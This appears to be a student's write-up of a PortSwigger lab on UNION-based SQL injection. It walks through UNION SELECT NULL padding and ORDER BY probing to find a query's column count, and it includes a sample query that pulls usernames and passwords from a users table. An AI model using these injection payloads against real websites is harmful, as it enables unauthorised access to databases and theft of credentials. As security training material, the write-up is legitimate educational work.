Link : https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns

![image](https://github.com/user-attachments/assets/e720dc25-4ea7-4ac3-993b-61c72d072a76)



Goal: Goal of this lab is to determine the number of columns returned using UNION based SQL Injection attack.


Concatenates the results of two queries into a single result set. You control whether the result set includes duplicate rows:
• UNION ALL - Includes duplicates.
• UNION - Excludes duplicates.

A UNION operation is different from a JOIN:
◇ A UNION concatenates result sets from two queries. But a UNION does not create individual rows from columns gathered from two tables.
◇ A JOIN compares columns from two tables, to create result rows composed of columns from two tables.
#Background (UNION)


# talbe1     table2
# a | b      c | d    
# -----------------
# 1 , 2      3 , 4
# 3 , 4      4 , 5

# Query 1#:
# SELECT a,b FROM table1
# result#:
# 1 , 2
# 3 , 4

# Query 2#:
# SELECT a,b FROM table1 UNION SELECT c,d FROM table2
# result #:
# 1 , 2
# 3 , 4
# 3 , 4
# 4 , 5


# Malecious Query #:
# SELECT a,b FROM table1 UNION SELECT username , password FROM users


The following are basic rules for combining the result sets of two queries by using UNION:
◇ The number and the order of the columns must be the same in all queries.

◇ The data types must be compatible.


for finding number of column in query 

1st way:

# select ? from table1 union select null

 <error> incorrect number of column
 ![image](https://github.com/user-attachments/assets/36517dc3-a2c0-4745-91bd-205377dec4f8)
![image](https://github.com/user-attachments/assets/72feb6fb-c07c-4271-9194-ab90a350f213)

 
# select ? from table1 union select  null,null

<error> incorrect number of column

![image](https://github.com/user-attachments/assets/6afb9861-2b39-4b85-9a89-357157f67337)

![image](https://github.com/user-attachments/assets/9cbf9eb7-33c1-422e-b463-f233437ef3ac)

# select ? from table1 union select null,null,null  

<status 200 ok > correct number of columns (number of null = number of columns=3)


![image](https://github.com/user-attachments/assets/f9ae6496-9a70-4fef-8a5e-807956c950ed)


2nd way 

using order by 

# select ? from table1 order by 1

status 200
![image](https://github.com/user-attachments/assets/1144ceba-4326-4a63-bfe7-523ce8f02c19)


# select ? from table1 order by 2

status 200 

![image](https://github.com/user-attachments/assets/bfe5816a-d4d0-469e-9457-96b1f9ef8a4f)

# select ? from table1 order by 3

status 200
![image](https://github.com/user-attachments/assets/5d5e68e0-b546-4c20-ba3b-456194af3fde)

# select ? from table1 order by 4 

<error> which means numer of columns = current number -1  i.e  4-1 = 3
![image](https://github.com/user-attachments/assets/590ae88c-f86a-45e1-a543-3b3571b43328)


![image](https://github.com/user-attachments/assets/86fe5642-03bc-4fea-bc58-cf94a7b5aa2f)

